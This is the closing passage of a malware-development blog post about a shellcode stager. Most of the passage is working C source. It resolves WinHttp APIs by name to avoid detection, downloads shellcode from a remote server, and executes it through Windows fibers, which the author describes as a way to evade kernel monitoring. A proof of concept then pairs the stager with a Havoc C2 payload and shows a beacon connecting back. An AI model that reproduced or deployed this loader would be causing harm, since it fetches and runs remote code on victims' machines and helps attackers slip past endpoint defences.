class="p">};</span>
  <span class="n">CHAR</span> <span class="n">cWinHttpCloseHandle</span><span class="p">[]</span>     <span class="o">=</span> <span class="p">{</span> <span class="sc">'W'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'C'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'s'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>

  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">WinHttp</span>   <span class="o">=</span> <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pLoadLibraryA</span><span class="p">(</span><span class="n">cWinHttp</span><span class="p">);</span>

  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpOpen</span>            <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">WinHttp</span><span class="p">,</span> <span class="n">cWinHttpOpen</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpConnect</span>         <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">WinHttp</span><span class="p">,</span> <span class="n">cWinHttpConnect</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpOpenRequest</span>     <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">WinHttp</span><span class="p">,</span> <span class="n">cWinHttpOpenRequest</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpReadData</span>        <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">WinHttp</span><span class="p">,</span> <span class="n">cWinHttpReadData</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpReceiveResponse</span> <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">WinHttp</span><span class="p">,</span> <span class="n">cWinHttpReceiveResponse</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpSendRequest</span>     <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">WinHttp</span><span class="p">,</span> <span class="n">cWinHttpSendRequest</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpQueryHeaders</span>    <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">WinHttp</span><span class="p">,</span> <span class="n">cWinHttpQueryHeaders</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpCloseHandle</span>     <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">WinHttp</span><span class="p">,</span> <span class="n">cWinHttpCloseHandle</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="execviafibers"><span class="me-2">ExecViaFibers</span><a href="https://oblivion-malware.xyz/posts/shellcode-pt4-stager-local-inject-fibers/#execviafibers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now letâ€™s talk about Fibers, a fascinating concept. Think of them as scheduled execution units that operate within the context of threads. Their main advantage lies in their stealthiness compared to traditional thread creation. Depending on the context, memory allocation may not be necessary, and their operation occurs exclusively in user space (UserLand). This makes them ideal for evading intensive monitoring solutions operating at kernel levels, such as â€¦ , Kernel Callbacks.</p><p>However, they may not be the best option for a Stager, as they require the payload to already be present in the code, in a section with execution permissions. In this case, simply allocating the payload to a variable in the text section and executing it would suffice. However, when dealing with a Stager, itâ€™s necessary to allocate memory with read, write, and execute permissions (RWX), which is highly undesirable, as discussed in previous modules.</p><p>So why am I using Fibers? Simply because I wanted to! I wanted to explore this concept on my blog. ðŸ˜„</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">ExecViaFibers</span><span class="p">(</span> <span class="n">_In_</span> <span class="n">INSTANCE</span> <span class="n">pInstance</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">PBYTE</span> <span class="n">ByteCodes</span><span class="p">){</span>

    <span class="n">LPVOID</span> <span class="n">ShellFibersAddr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ShellFibersAddr</span> <span class="o">=</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pCreateFiber</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span> <span class="p">(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)</span><span class="n">ByteCodes</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))){</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">))){</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pSwitchToFiber</span><span class="p">(</span><span class="n">ShellFibersAddr</span><span class="p">);</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><p>First, we need to create the Fiber using the CreateFiber API. Then, we convert the current thread to a Fiber using ConvertThreadToFiber, and finally, we use SwitchToFiber to execute the created Fiber.</p><h2 id="stagerreceive"><span class="me-2">StagerReceive</span><a href="https://oblivion-malware.xyz/posts/shellcode-pt4-stager-local-inject-fibers/#stagerreceive" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The function StagerReceive is used to receive data from a web server using the WinHttp API of Windows. This function takes several parameters, including information about the program instance, such as the server host, port, path of the resource on the server, and pointers to store the received data and its size.</p><p>The function begins by opening a WinHttp session using WinHttpOpen, then connects to the server using WinHttpConnect, and opens an HTTP request using WinHttpOpenRequest.</p><p>After configuring the request, the function sends the HTTP request using WinHttpSendRequest and waits for the serverâ€™s response using WinHttpReceiveResponse.</p><p>Next, the size of the received data is queried using WinHttpQueryHeaders, and a buffer is allocated to store this data.</p><p>Finally, the data is read from the server in a loop using WinHttpReadData, and the total size of the read data is verified. The read data is stored in the previously allocated temporary buffer.</p><p>The function ends by releasing the handles used and assigning the received data and its size to the pointers passed as parameters.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">StagerReceive</span><span class="p">(</span>
    <span class="n">_In_</span>  <span class="n">INSTANCE</span> <span class="n">pInstance</span><span class="p">,</span> 
    <span class="n">_In_</span>  <span class="n">LPWSTR</span> <span class="n">Host</span><span class="p">,</span> 
    <span class="n">_In_</span>  <span class="kt">int</span> <span class="n">Port</span><span class="p">,</span> 
    <span class="n">_In_</span>  <span class="n">LPWSTR</span> <span class="n">Path</span><span class="p">,</span>
    <span class="n">_Out_</span> <span class="n">PBYTE</span> <span class="o">*</span><span class="n">ByteCodes</span><span class="p">,</span> 
    <span class="n">_Out_</span> <span class="n">DWORD</span> <span class="o">*</span><span class="n">ByteSize</span>
<span class="p">)</span> <span class="p">{</span>
    <span class="n">HINTERNET</span> <span class="n">hSession</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">hConnect</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">hRequest</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">WCHAR</span> <span class="n">wMethodRequest</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"GET"</span><span class="p">;</span>
    
    <span class="n">BOOL</span>  <span class="n">bResults</span>      <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dwSize</span>       <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dwDownloaded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BYTE</span><span class="o">*</span> <span class="n">pTempBuffer</span>  <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">PVOID</span> <span class="n">Heap</span> <span class="o">=</span> <span class="n">NtCurrentTeb</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ProcessEnvironmentBlock</span><span class="o">-&gt;</span><span class="n">ProcessHeap</span><span class="p">;</span>

    <span class="n">hSession</span> <span class="o">=</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpOpen</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">WINHTTP_ACCESS_TYPE_DEFAULT_PROXY</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hSession</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">hConnect</span> <span class="o">=</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpConnect</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span> <span class="n">Host</span><span class="p">,</span> <span class="n">Port</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hConnect</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">hRequest</span> <span class="o">=</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpOpenRequest</span><span class="p">(</span><span class="n">hConnect</span><span class="p">,</span> <span class="n">wMethodRequest</span><span class="p">,</span> <span class="n">Path</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span> <span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hRequest</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">bResults</span> <span class="o">=</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpSendRequest</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WINHTTP_NO_REQUEST_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bResults</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">bResults</span> <span class="o">=</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpReceiveResponse</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bResults</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">DWORD</span> <span class="n">dwContentLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dwSizeSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span>
    <span class="n">bResults</span> <span class="o">=</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpQueryHeaders</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="n">WINHTTP_QUERY_CONTENT_LENGTH</span> <span class="o">|</span> <span class="n">WINHTTP_QUERY_FLAG_NUMBER</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwContentLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSizeSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bResults</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pTempBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pRtlAllocateHeap</span><span class="p">(</span><span class="n">Heap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dwContentLength</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pTempBuffer</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">do</span> <span class="p">{</span>
        <span class="n">bResults</span> <span class="o">=</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpReadData</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">pTempBuffer</span> <span class="o">+</span> <span class="n">dwDownloaded</span><span class="p">),</span> <span class="n">dwContentLength</span> <span class="o">-</span> <span class="n">dwDownloaded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bResults</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dwDownloaded</span> <span class="o">+=</span> <span class="n">dwSize</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pRtlFreeHeap</span><span class="p">(</span><span class="n">Heap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pTempBuffer</span><span class="p">);</span>
            <span class="n">pTempBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> 
            <span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">dwSize</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">dwDownloaded</span> <span class="o">&lt;</span> <span class="n">dwContentLength</span><span class="p">);</span>

    <span class="o">*</span><span class="n">ByteCodes</span> <span class="o">=</span> <span class="n">pTempBuffer</span><span class="p">;</span>
    <span class="o">*</span><span class="n">ByteSize</span> <span class="o">=</span> <span class="n">dwContentLength</span><span class="p">;</span>

<span class="nl">END:</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hRequest</span><span class="p">)</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpCloseHandle</span><span class="p">(</span><span class="n">hRequest</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span><span class="p">)</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hSession</span><span class="p">)</span> <span class="n">pInstance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pWinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h1 id="poc">POC</h1><p>One advantage of using a code like this, regardless of position-independent code (PIC), is that, for example, Havoc doesnâ€™t have a Stager. Therefore, the generated shellcode contains the entire agent, without optimizations. If we need a slightly smaller shellcode, we would be left empty-handed. However, we can develop it as I demonstrated. Additionally, it can be used as an exploit payload and for various other purposes.</p><p>Hereâ€™s a demonstration of its use. First, letâ€™s navigate to the root folder and run the make command, which will use the Makefile for compilation automation, shellcode (text) extraction with the Python script extract.py, and preparation for our use.</p><p></p><p>Now we will use the Ldr that was explained in the parent chapter; its just a loader for the shellcode. We could use VBA, JS, or any other method, but since that wasnâ€™t the focus, I decided to simplify.</p><p>When the shellcode (text) is extracted, itâ€™s stored in the bin folder within the Ldr folder. Now we will generate a payload with Havoc in Attack &gt; Payload and choose the shellcode option.</p><p></p><p>After generating the payload, we will use Python3 to create a web server with the command python -m http.server.</p><p></p><p>Now we can run the loader that will load our shellcode.bin. The loader reads a shellcode from disk as an argument.</p><p></p><p>Now we can look at the Havoc interface and see that a beacon connection has been initialized.</p><p></p><h1 id="end">End</h1><p>Alright, weâ€™re done here. If anyone has any questions or anything like that, feel free to contact me. <a href="https://github.com/Entropy-z/Shellcoding-Stager_Local_Inject">Github Repository</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="https://oblivion-malware.xyz/categories/malware-development/">Malware Development</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 "><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Shellcode%20-%20Pt%204:%20Stager%20+%20Local%20Injection%20using%20Fibers%20-%20Oblivion&amp;url=%2Fposts%2Fshellcode-pt4-stager-local-inject-fibers%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Twitter" data-bs-original-title="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Shellcode%20-%20Pt%204:%20Stager%20+%20Local%20Injection%20using%20Fibers%20-%20Oblivion&amp;u=%2Fposts%2Fshellcode-pt4-stager-local-inject-fibers%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Facebook" data-bs-original-title="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fshellcode-pt4-stager-local-inject-fibers%2F&amp;text=Shellcode%20-%20Pt%204:%20Stager%20+%20Local%20Injection%20using%20Fibers%20-%20Oblivion" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Telegram" data-bs-original-title="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" data-title-succeed="Link copied successfully!" data-bs-original-title="Copy link"> <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="https://oblivion-malware.xyz/tags/windows/">Windows</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
</body></html>